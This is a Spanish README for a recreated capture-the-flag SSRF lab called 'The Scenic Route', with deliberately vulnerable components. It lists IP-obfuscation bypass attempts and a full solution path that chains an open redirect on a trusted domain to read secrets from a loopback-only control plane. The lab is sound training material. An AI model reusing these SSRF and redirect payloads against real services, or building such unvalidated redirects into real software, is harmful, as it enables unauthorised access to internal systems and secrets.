# The Scenic Route — recreación (5ub4k3m1's inc.)

Recreación desplegable del reto SSRF **The Scenic Route**, con la marca
**5ub4k3m1's inc.** y diseño corporativo negro/morado. Reproduce las mismas
particularidades del original:

- **SSRF** en el probe de monitoreo (busca URLs del usuario cada `PROBE_INTERVAL` s
  y guarda status + primeros 512 bytes).
- **Filtro anti-SSRF**: **bloquea toda IP privada** (en cualquier notación:
  `127.0.0.1`, `0x7f000001`, `2130706433`, `[::1]`, `0177.0.0.1`, `127.1`) y
  **solo acepta dominios** (las IP literales públicas también se rechazan).
- **Sin egress externo**: la red del probe solo ve lo interno; cualquier dominio
  público hace `ConnectTimeout` (política de salida aplicada en el probe).
- **Open redirect** `GET /go?next=` en el dominio de confianza (los mismos
  hipervínculos-pista del footer lo delatan).
- **Control plane** en `127.0.0.1:9101` (solo loopback, sin auth) con la flag en
  `/v1/secrets`. La pista de su ubicación está filtrada en `/static/app.js`.

## Desplegar

```bash
docker compose up -d --build
# Dashboard:  http://localhost:8080/
```

Reset del estado (limpia los monitores registrados):

```bash
docker compose restart
```

Apagar:

```bash
docker compose down
```

Variables (en `docker-compose.yml`): `FLAG`, `PUBLIC_HOST`, `PROBE_INTERVAL`.

## Cómo se juega

Registras URLs en el formulario del dashboard; el probe las busca y muestra el
resultado. El objetivo es leer la flag del control plane interno, al que **no**
llegas directo:

| Registras | Resultado | Por qué |
|---|---|---|
| `http://127.0.0.1:9101/v1/secrets` | `dirección privada bloqueada` | IP privada literal |
| `http://0x7f000001:9101/…` / `http://2130706433:9101/…` / `http://[::1]:9101/…` | `dirección privada bloqueada` | ofuscaciones normalizadas |
| `http://8.8.8.8/` | `no se admiten IP literales` | solo dominios |
| `https://example.com/` (o tu propio server) | `ConnectTimeout` | sin egress externo |
| `http://sub4k3m1.status.monitor:9101/v1/secrets` | `Connection refused` | el dominio resuelve a la IP de red, y `:9101` solo existe en loopback |
| **`http://sub4k3m1.status.monitor:8080/go?next=http://127.0.0.1:9101/v1/secrets`** | **200 + FLAG** | el open redirect en el dominio de confianza + el probe que **no re-valida** el `302` |

> `sub4k3m1.status.monitor` es el dominio de confianza del servicio (allowlisted). El
> dashboard se sirve en `localhost:8080` por comodidad; en la URL del monitor usa
> el dominio para que el filtro la acepte.

### Ruta de solución (resumen)

1. El footer y `/static/app.js` revelan el endpoint `/go?next=` (open redirect) y
   que el control plane vive en `127.0.0.1:9101` (comentario TODO).
2. Registrar cualquier interno directo → `dirección privada bloqueada`; externo →
   `ConnectTimeout`. El filtro solo valida la URL registrada.
3. Encadenar por el dominio de confianza:
   `…/go?next=http://127.0.0.1:9101/` → `200` con el banner del control plane.
4. Enumerar `…/go?next=http://127.0.0.1:9101/v1/` (lista `/v1/monitors` y
   `/v1/secrets`) o `…/openapi.json`.
5. `…/go?next=http://127.0.0.1:9101/v1/secrets` → la **flag** en los 512 bytes.

## Estructura

```
recreation/
├── docker-compose.yml     # red, puerto 8080, extra_hosts del dominio de confianza
├── Dockerfile
├── requirements.txt
└── app/
    ├── server.py          # app pública + control plane (loopback) + probe
    └── static/
        ├── index.template.html   # dashboard "5ub4k3m1's inc." (negro/morado)
        ├── style.css
        └── app.js                # incluye el TODO-pista de 127.0.0.1:9101
```

## Nota sobre la fidelidad

En el reto original el dominio público resolvía a una IP **pública** (ingress), y
por eso pasaba el filtro "bloquea privadas". Sin una IP pública real en local, aquí
el dominio de confianza se implementa como **allowlist por hostname** — un patrón
de fallo SSRF igual de realista (dominio confiable que aloja un open redirect). El
resto de la mecánica (bloqueo de privadas, solo dominios, sin egress, redirect no
re-validado, control plane en loopback) es idéntica.
